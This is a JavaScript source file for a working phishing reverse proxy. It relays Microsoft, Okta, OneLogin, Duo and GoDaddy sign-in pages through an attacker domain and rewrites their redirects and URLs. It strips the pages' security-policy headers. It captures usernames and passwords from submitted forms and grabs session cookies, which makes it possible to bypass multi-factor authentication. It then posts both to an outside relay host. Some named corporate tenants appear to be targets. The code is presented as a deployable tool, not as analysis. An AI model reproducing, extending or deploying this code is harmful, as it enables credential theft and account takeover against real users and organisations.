export const runtime = 'edge';

// ==================== DYNAMIC MULTI-UPSTREAM CONFIG ====================
const VERCEL_URL = 'https://vercelorisdns.duck.org/api/relay';
const INITIAL_UPSTREAM = 'login.microsoftonline.com';
const PROXY_PREFIX = '/_p/';
const BLOCKED_IPS = ['0.0.0.0', '127.0.0.1'];

// ADDED: www.office.com and office.com to the list
const IDENTITY_PROVIDERS = {
  'login.microsoftonline.com': { type: 'microsoft', name: 'Microsoft' },
  'login.live.com': { type: 'microsoft', name: 'Microsoft Live' },
  'account.live.com': { type: 'microsoft', name: 'Microsoft Account' },
  'account.microsoft.com': { type: 'microsoft', name: 'Microsoft Account' },
  'aadcdn.msauth.net': { type: 'microsoft', name: 'Microsoft CDN' },
  'www.office.com': { type: 'microsoft', name: 'Office 365' },        // ADDED
  'office.com': { type: 'microsoft', name: 'Office 365' },            // ADDED
  'microsoft365.com': { type: 'microsoft', name: 'Microsoft 365' },   // ADDED
  'outlook.office.com': { type: 'microsoft', name: 'Outlook' },       // ADDED
  'outlook.live.com': { type: 'microsoft', name: 'Outlook Live' },    // ADDED
  'o.okta.com': { type: 'okta', name: 'Okta' },
  'sci.okta.com': { type: 'okta', name: 'Okta Sci' },
  'dotfoods.okta.com': { type: 'okta', name: 'Okta DotFoods' },
  'login.okta.com': { type: 'okta', name: 'Okta Login' },
  'ulgroup.okta.com': { type: 'okta', name: 'Okta ULGroup' },
  'empowermm.onelogin.com': { type: 'onelogin', name: 'OneLogin' },
  'duosecurity.com': { type: 'duo', name: 'Duo' },
  'api-aa1a6aea.duosecurity.com': { type: 'duo', name: 'Duo API' },
  'login.duosecurity.com': { type: 'duo', name: 'Duo Login' },
  'sso.godaddy.com': { type: 'godaddy', name: 'GoDaddy' },
  'sso.secureserver.net': { type: 'godaddy', name: 'GoDaddy Legacy' }
};

const AUTH_COOKIES = {
  microsoft: ['ESTSAUTH', 'ESTSAUTHPERSISTENT', 'SignInStateCookie', 'esctx', 'brcap', 'ESTSSC', 'ESTSAUTHLIGHT', 'buid', 'fpc', 'stsservicecookie', 'x-ms-gateway-slice'],
  okta: ['sid', 'vid', 'authtoken', 'oktaStateToken', 'DT', 'tnt'],
  onelogin: ['sub_session_onelogin', 'onelogin', 'sub'],
  duo: ['.*'],
  godaddy: ['akm_lmprb-ssn', 'akm_lmprb', 'auth_id', 'auth_token']
};

const CREDENTIAL_PATTERNS = {
  microsoft: {
    username: ['login', 'UserName', 'username', 'email', 'account', 'DomainUser', 'loginfmt', 'i0116'],
    password: ['passwd', 'Password', 'password', 'login_password', 'pass', 'pwd', 'session_password', 'PASSWORD', 'i0118']
  },
  okta: {
    username: ['username', 'user', 'email', 'identifier', 'login', 'i0116'],
    password: ['password', 'pass', 'pwd', 'credentials[passcode]', 'answer', 'credentials[password]']
  },
  onelogin: {
    username: ['username', 'email', 'login', 'user'],
    password: ['password', 'pwd', 'pass']
  },
  duo: {
    username: ['username', 'email', 'user'],
    password: ['passcode', 'answer', 'password'],
    device: ['device', 'phone_number']
  },
  godaddy: {
    username: ['username', 'email', 'login', 'name', 'account'],
    password: ['password', 'pwd', 'pass', 'credential']
  }
};
// =======================================================================

async function sendToVercel(type, data) {
  try {
    await fetch(VERCEL_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ type, timestamp: new Date().toISOString(), ...data }),
    });
  } catch (e) {}
}

async function exfiltrateCookiesFile(cookieText, ip, platform = 'unknown', url = '') {
  try {
    const content = `IP: ${ip}\nPlatform: ${platform}\nURL: ${url}\nData: Cookies found:\n\n${cookieText}\n`;
    const formData = new FormData();
    formData.append("file", new Blob([content], { type: "text/plain" }), `${ip}-${platform}-COOKIE.txt`);
    formData.append("ip", ip);
    formData.append("type", "cookie-file");
    
    await fetch(VERCEL_URL, {
      method: "POST",
      body: formData,
    });
  } catch (e) {}
}

function getUpstreamInfo(request) {
  const url = new URL(request.url);
  const path = url.pathname;
  
  // Handle proxied requests (e.g., /_p/www.office.com/login)
  if (path.startsWith(PROXY_PREFIX)) {
    const withoutPrefix = path.slice(PROXY_PREFIX.length);
    const upstreamDomain = withoutPrefix.split('/')[0];
    const upstreamPath = '/' + withoutPrefix.slice(upstreamDomain.length + 1);
    
    const provider = Object.entries(IDENTITY_PROVIDERS).find(([domain]) => domain === upstreamDomain);
    const type = provider ? provider[1].type : 'unknown';
    
    return {
      upstream: upstreamDomain,
      type: type,
      path: upstreamPath,
      isProxied: true,
      originalPath: path
    };
  }
  
  // Default to Microsoft
  return {
    upstream: INITIAL_UPSTREAM,
    type: 'microsoft',
    path: path,
    isProxied: false,
    originalPath: path
  };
}

// CRITICAL FIX: Better redirect rewriting with explicit host detection
function rewriteRedirect(location, currentHost) {
  try {
    const locUrl = new URL(location);
    const upstreamDomain = locUrl.hostname;
    
    // Check if it's a domain we should proxy
    const shouldProxy = IDENTITY_PROVIDERS[upstreamDomain] || 
                       upstreamDomain.includes('microsoft') || 
                       upstreamDomain.includes('live.com') || 
                       upstreamDomain.includes('office.com') ||
                       upstreamDomain.includes('msauth.net');
    
    if (shouldProxy) {
      // Rewrite to path-based route: https://yourdomain.com/_p/www.office.com/login
      const newPath = `${PROXY_PREFIX}${upstreamDomain}${locUrl.pathname}${locUrl.search}`;
      
      // CRITICAL: Ensure we use the actual domain, not localhost
      // currentHost should be your actual domain (e.g., vercelorisdns.duck.org)
      if (currentHost.includes('localhost') || currentHost === '127.0.0.1') {
        // If somehow localhost, try to get from request or use fallback
        console.error('Warning: currentHost is localhost, check deployment');
      }
      
      return `https://${currentHost}${newPath}`;
    }
    
    return location;
  } catch (e) {
    // If it's a relative URL like /login, route through current upstream
    if (location.startsWith('/')) {
      return location; // Keep relative URLs as-is, they'll be handled by browser
    }
    return location;
  }
}

function rewriteBodyUrls(text, currentHost, currentUpstream) {
  let rewritten = text;
  
  // 1. CRITICAL: Fix localhost references immediately
  rewritten = rewritten.replace(/https?:\/\/localhost(:\d+)?/g, `https://${currentHost}`);
  rewritten = rewritten.replace(/\/\/localhost(:\d+)?/g, `//${currentHost}`);
  
  // 2. Rewrite all known identity providers to path-based routes
  Object.keys(IDENTITY_PROVIDERS).forEach(domain => {
    const escaped = domain.replace(/\./g, '\\.');
    
    // https://domain.com/path -> https://currentHost/_p/domain.com/path
    rewritten = rewritten.replace(
      new RegExp(`https://${escaped}(?!\\w)`, 'g'), 
      `https://${currentHost}${PROXY_PREFIX}${domain}`
    );
    
    // http://domain.com/path -> https://currentHost/_p/domain.com/path
    rewritten = rewritten.replace(
      new RegExp(`http://${escaped}(?!\\w)`, 'g'), 
      `https://${currentHost}${PROXY_PREFIX}${domain}`
    );
    
    // //domain.com/path (protocol-relative)
    rewritten = rewritten.replace(
      new RegExp(`//${escaped}(?!\\w)`, 'g'), 
      `//${currentHost}${PROXY_PREFIX}${domain}`
    );
  });
  
  // 3. Handle Microsoft-specific endpoints that appear as relative paths
  // These are often in the format: /common/GetCredentialType, /Me.htm, etc.
  rewritten = rewritten.replace(
    /(["'])\/(common|ppsecure|auth|api|Me\.htm|Prefetch\.aspx)/g,
    `$1https://${currentHost}${PROXY_PREFIX}${currentUpstream}/$2`
  );
  
  // 4. Fix JS location/DOM references
  rewritten = rewritten.replace(
    /window\.location\.hostname\s*=\s*["'][^"']+["']/g,
    `window.location.hostname = "${currentHost}"`
  );
  rewritten = rewritten.replace(
    /document\.domain\s*=\s*["'][^"']+["']/g,
    `document.domain = "${currentHost}"`
  );
  rewritten = rewritten.replace(
    /window\.location\.host\s*=\s*["'][^"']+["']/g,
    `window.location.host = "${currentHost}"`
  );
  
  // 5. Handle specific Microsoft login flows
  // Rewrite references to login.microsoftonline.com in JS strings
  rewritten = rewritten.replace(
    /(["'])(https?:)?\/\/login\.microsoftonline\.com([^"']*)/g,
    `$1https://${currentHost}${PROXY_PREFIX}login.microsoftonline.com$3`
  );
  
  return rewritten;
}

export default async function handleRequest(request) {
  const url = new URL(request.url);
  const ipAddress = request.headers.get('x-forwarded-for')?.split(',')[0]?.trim() || 'unknown';
  
  // CRITICAL FIX: Get the actual hostname from the request
  const currentHost = url.hostname;
  
  if (BLOCKED_IPS.includes(ipAddress)) {
    return new Response('Access denied.', { status: 403 });
  }
  
  const upstreamInfo = getUpstreamInfo(request);
  const upstreamDomain = upstreamInfo.upstream;
  const platform = upstreamInfo.type;
  const upstreamPath = upstreamInfo.path + url.search;
  
  console.log(`[${platform}] Host: ${currentHost} -> Upstream: ${upstreamDomain}${upstreamPath}`);
  
  const upstreamUrl = `https://${upstreamDomain}${upstreamPath}`;
  
  const newHeaders = new Headers(request.headers);
  newHeaders.delete('Host');
  newHeaders.set('Host', upstreamDomain);
  newHeaders.set('Referer', `https://${upstreamDomain}/`);
  newHeaders.set('Origin', `https://${upstreamDomain}`);
  
  // Credential harvesting
  if (request.method === 'POST') {
    try {
      const cloned = request.clone();
      const contentType = cloned.headers.get('content-type') || '';
      let bodyData = {};
      
      if (contentType.includes('application/json')) {
        bodyData = await cloned.json();
      } else {
        const body = await cloned.text();
        const params = new URLSearchParams(body);
        params.forEach((v, k) => { bodyData[k] = v; });
      }
      
      const patterns = CREDENTIAL_PATTERNS[platform] || CREDENTIAL_PATTERNS.microsoft;
      let creds = { ip: ipAddress, platform, upstream: upstreamDomain, url: request.url };
      let found = false;
      
      for (const [key, value] of Object.entries(bodyData)) {
        if (!value) continue;
        const lowerKey = key.toLowerCase();
        
        patterns.username.forEach(p => {
          if (lowerKey.includes(p.toLowerCase())) {
            creds.username = value;
            found = true;
          }
        });
        
        patterns.password.forEach(p => {
          if (lowerKey.includes(p.toLowerCase())) {
            creds.password = value;
            found = true;
          }
        });
      }
      
      if (found && creds.username) {
        await sendToVercel('credentials', creds);
        console.log(`[${platform}] Captured:`, creds.username);
      }
    } catch (e) {
      console.error('Cred harvest error:', e);
    }
  }
  
  try {
    const fetchOptions = {
      method: request.method,
      headers: newHeaders,
      redirect: 'manual' // Handle redirects manually to rewrite them
    };
    
    if (!['GET', 'HEAD'].includes(request.method)) {
      fetchOptions.body = request.body;
      fetchOptions.duplex = 'half';
    }
    
    const response = await fetch(upstreamUrl, fetchOptions);
    
    // CRITICAL: Handle redirects by rewriting Location header
    if ([301, 302, 303, 307, 308].includes(response.status)) {
      const location = response.headers.get('Location');
      if (location) {
        const newResponseHeaders = new Headers(response.headers);
        const rewritten = rewriteRedirect(location, currentHost);
        
        console.log(`[${platform}] Redirect: ${location} -> ${rewritten}`);
        
        newResponseHeaders.set('Location', rewritten);
        return new Response(null, { status: response.status, headers: newResponseHeaders });
      }
    }
    
    if (response.headers.get('Upgrade')?.toLowerCase() === 'websocket') {
      return response;
    }
    
    const newResponseHeaders = new Headers(response.headers);
    newResponseHeaders.set('access-control-allow-origin', '*');
    newResponseHeaders.set('access-control-allow-credentials', 'true');
    newResponseHeaders.delete('content-security-policy');
    newResponseHeaders.delete('content-security-policy-report-only');
    newResponseHeaders.delete('clear-site-data');
    
    let cookieString = '';
    let hasAuth = false;
    const cookies = response.headers.getSetCookie ? 
      response.headers.getSetCookie() : 
      [response.headers.get('Set-Cookie')].filter(Boolean);
    
    if (cookies.length) {
      cookieString = cookies.join('; ');
      
      const patterns = AUTH_COOKIES[platform] || [];
      hasAuth = patterns.some(p => {
        if (p === '.*') return true;
        return cookieString.toLowerCase().includes(p.toLowerCase());
      });
      
      if (hasAuth || cookieString.length > 0) {
        await exfiltrateCookiesFile(cookieString, ipAddress, platform, request.url);
      }
      
      cookies.forEach(cookie => {
        let modified = cookie;
        modified = modified.replace(/Domain=[^;]+;?/gi, '');
        newResponseHeaders.append('Set-Cookie', modified);
      });
    }
    
    const contentType = response.headers.get('content-type') || '';
    if (/text\/html|application\/javascript|application\/json|text\/javascript/.test(contentType)) {
      let text = await response.text();
      text = rewriteBodyUrls(text, currentHost, upstreamDomain);
      
      return new Response(text, {
        status: response.status,
        headers: newResponseHeaders
      });
    }
    
    return new Response(response.body, {
      status: response.status,
      headers: newResponseHeaders
    });
    
  } catch (error) {
    console.error(`[${platform}] Error:`, error);
    return new Response(JSON.stringify({
      error: 'Proxy Error',
      message: error.message,
      upstream: upstreamDomain,
      platform
    }), { status: 502, headers: { 'content-type': 'application/json' } });
  }
}

export const GET = handleRequest;
export const POST = handleRequest;
export const PUT = handleRequest;
export const DELETE = handleRequest;
export const PATCH = handleRequest;
export const OPTIONS = handleRequest;
export const HEAD = handleRequest;
